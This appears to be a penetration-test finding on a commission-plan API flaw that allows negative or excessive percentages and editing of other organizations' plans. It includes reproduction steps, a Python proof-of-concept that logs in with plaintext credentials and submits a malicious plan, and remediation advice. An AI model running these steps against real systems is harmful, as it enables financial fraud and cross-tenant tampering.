# Commission Plan Manipulation Allows Negative Commission Values and Unauthorized Modifications

**ID:** vuln-0017
**Severity:** CRITICAL
**Found:** 2026-02-26 16:45:05 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/UpdateCommissionPlan
**Method:** PUT
**CWE:** CWE-840
**CVSS:** 9.9

## Description

A critical business logic vulnerability was discovered in the commission plan management functionality that allows attackers to create and modify commission plans with negative values, bypass percentage validation checks, and manipulate plans owned by other organizations.

The vulnerability exists in the CommissionPlan controller endpoints, specifically in the CreateCommissionPlan and UpdateCommissionPlan actions. The application fails to properly validate commission percentage values and enforce ownership restrictions on commission plans.

An attacker with Organization-level access can:
1. Create commission plans with negative commission percentages
2. Set commission percentages beyond authorized limits (e.g., 150%)
3. Modify commission plans owned by other organizations
4. Bypass client-specific commission rules

## Impact

Successful exploitation of this vulnerability allows attackers to:

1. **Financial Loss**: Create commission plans that result in negative payouts, effectively stealing money from the company
2. **Unauthorized Data Modification**: Modify commission plans owned by other organizations, disrupting their commission structures
3. **Business Logic Manipulation**: Bypass intended commission percentage limits, allowing for excessive payouts
4. **Cross-Organization Data Access**: Access and modify commission plans across organizational boundaries

The financial impact can be severe, potentially resulting in significant monetary losses through manipulated commission calculations and unauthorized payouts.

## Technical Analysis

The vulnerability exists due to insufficient validation in the commission plan creation and modification endpoints:

1. **Negative Value Validation Missing**: The application does not validate that commission percentages are positive values
2. **Percentage Range Validation Missing**: No validation exists to enforce maximum commission percentage limits
3. **Ownership Validation Missing**: The application does not verify that users can only modify commission plans they own
4. **Client-Specific Rule Bypass**: Organization users can create/modify plans that should be restricted to specific clients

The CommissionPlan controller endpoints accept JSON payloads with commission percentage values that are directly processed without proper validation. The application relies on client-side validation only, which can be easily bypassed.

## Proof of Concept

**Reproduction Steps:**

1. Authenticate as an Organization user (nlnarayana3858@gmail.com / User@1234)
2. Navigate to the Commission Plan creation interface
3. Intercept the CreateCommissionPlan API request using a proxy
4. Modify the commission percentage value to a negative number (e.g., -10%)
5. Submit the modified request
6. Observe that the commission plan is created with the negative value
7. Verify the negative commission plan affects commission calculations

**Alternative Exploitation:**
1. Authenticate as an Organization user
2. Intercept the GetCommissionPlanByOrgId request to list available plans
3. Select a commission plan from another organization
4. Intercept the UpdateCommissionPlan request
5. Modify the commission percentage to an excessive value (e.g., 150%)
6. Submit the modified request
7. Observe that the commission plan is updated successfully

```
import requests
import json

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
AUTH_ENDPOINT = f"{BASE_URL}/api/authenticate"
COMMISSION_PLAN_ENDPOINT = f"{BASE_URL}/api/CommissionPlan/CreateCommissionPlan"

# Organization user credentials
CREDENTIALS = {
    "username": "nlnarayana3858@gmail.com",
    "password": "User@1234"
}

# Step 1: Authenticate and get JWT token
auth_response = requests.post(AUTH_ENDPOINT, json=CREDENTIALS)
auth_data = auth_response.json()
jwt_token = auth_data['id_token']

# Step 2: Create commission plan with negative commission percentage
headers = {
    "Authorization": f"Bearer {jwt_token}",
    "Content-Type": "application/json"
}

# Malicious commission plan payload with negative commission
malicious_plan = {
    "planName": "Exploit Plan - Negative Commission",
    "planDescription": "Plan created with negative commission value",
    "commissionPercentage": -10,  # Negative commission value
    "isActive": True,
    "clientId": None,
    "orgId": "current_org_id",  # Would be replaced with actual org ID
    "rules": []
}

# Step 3: Submit the malicious commission plan
response = requests.post(COMMISSION_PLAN_ENDPOINT, headers=headers, json=malicious_plan)

# Step 4: Verify the plan was created with negative commission
if response.status_code == 200:
    print("SUCCESS: Commission plan created with negative commission value")
    print(f"Response: {response.json()}")
    print("\nThis allows the attacker to create commission plans that result in negative payouts")
else:
    print(f"FAILED: {response.status_code} - {response.text}")
```

## Remediation

**Immediate Remediation Steps:**

1. **Implement Server-Side Validation**:
   - Add validation to ensure commission percentages are positive values
   - Enforce maximum commission percentage limits (e.g., 100%)
   - Validate all numeric inputs for commission plans

2. **Enforce Ownership Restrictions**:
   - Implement proper ownership checks for commission plan creation/modification
   - Verify that users can only modify plans they own or have permission to access
   - Add organization/client-specific authorization checks

3. **Implement Business Rules Validation**:
   - Add validation to enforce business rules for commission percentages
   - Implement client-specific commission rules that cannot be bypassed
   - Add validation for commission plan naming conventions

4. **Audit and Monitoring**:
   - Implement logging for all commission plan creation/modification events
   - Set up alerts for suspicious commission plan changes
   - Regularly audit commission plans for unauthorized modifications

**Long-Term Recommendations:**

1. Implement a comprehensive commission management workflow with approval processes
2. Add role-based access control for commission plan management
3. Implement change tracking for all commission plan modifications
4. Conduct regular security testing of commission-related functionality
5. Implement financial controls to detect and prevent commission manipulation

